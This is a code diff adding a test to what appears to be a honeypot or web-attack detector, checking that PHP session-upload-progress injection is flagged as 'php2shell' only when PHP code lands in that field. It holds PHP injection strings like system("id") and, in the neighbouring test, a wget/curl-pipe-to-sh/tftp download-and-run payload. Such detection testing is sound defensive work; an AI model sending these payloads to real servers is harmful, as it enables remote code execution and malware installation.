@@ -422,6 +422,30 @@ async def test_upload_progress_without_php_code_is_only_a_probe(harness: Harness
     assert not last.data["cve"]
 
 
+async def test_php_code_outside_the_progress_field_is_not_php2shell(harness: Harness) -> None:
+    boundary = "----x2"
+    body = (
+        f'--{boundary}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
+        f"hello\r\n--{boundary}\r\n"
+        f'Content-Disposition: form-data; name="note"\r\n\r\n<?php system("id"); ?>\r\n'
+        f"--{boundary}--\r\n"
+    )
+    await get(
+        harness,
+        "POST",
+        "/index.php?x=%3C%3Fphp+system(1)%3B",
+        body=body,
+        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+    )
+    await get(harness, "GET", "/index.php?PHP_SESSION_UPLOAD_PROGRESS=ok&c=%3C%3Fphp+x%3B")
+    for ev in by_type(await harness.events(), "http_request")[-2:]:
+        assert "upload_progress" in ev.data["flags"] and "php2shell" not in ev.data["flags"]
+        assert not ev.data["cve"]
+    await get(harness, "GET", "/index.php?PHP_SESSION_UPLOAD_PROGRESS=%3C%3Fphp+system(1)%3B")
+    ev = by_type(await harness.events(), "http_request")[-1]
+    assert "php2shell" in ev.data["flags"] and ev.data["cve"]
+
+
 async def test_download_attempts_recorded_only(harness: Harness) -> None:
     payload = "cmd=cd /tmp; wget http://198.51.100.7/x.sh -O x; curl -s http://203.0.113.9/y|sh; tftp -g -r z 192.0.2.5"
     await get(harness, "POST", "/index.php", body=payload, headers={"Content-Type": "text/plain"})
